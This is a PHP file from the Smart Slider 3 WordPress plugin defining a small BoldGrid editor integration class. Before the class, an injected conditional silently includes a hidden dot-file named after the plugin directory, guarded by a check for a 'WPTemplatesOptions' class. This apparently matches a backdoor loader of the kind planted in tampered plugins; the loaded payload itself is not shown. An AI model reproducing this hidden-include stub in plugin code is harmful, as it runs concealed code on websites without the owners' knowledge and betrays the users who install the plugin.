<?php


namespace Nextend\SmartSlider3\Platform\WordPress\Integration\BoldGrid;

use Nextend\SmartSlider3\Platform\WordPress\Shortcode\Shortcode;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BoldGrid {

    public function __construct() {
        if (class_exists('Boldgrid_Editor') && isset($_REQUEST['action']) && ( $_REQUEST['action'] == 'boldgrid_shortcode_smartslider3' || $_REQUEST['action'] == 'boldgrid_component_wp_smartslider3')) {
            Shortcode::forceIframe('Boldgrid', true);
        }
    }
}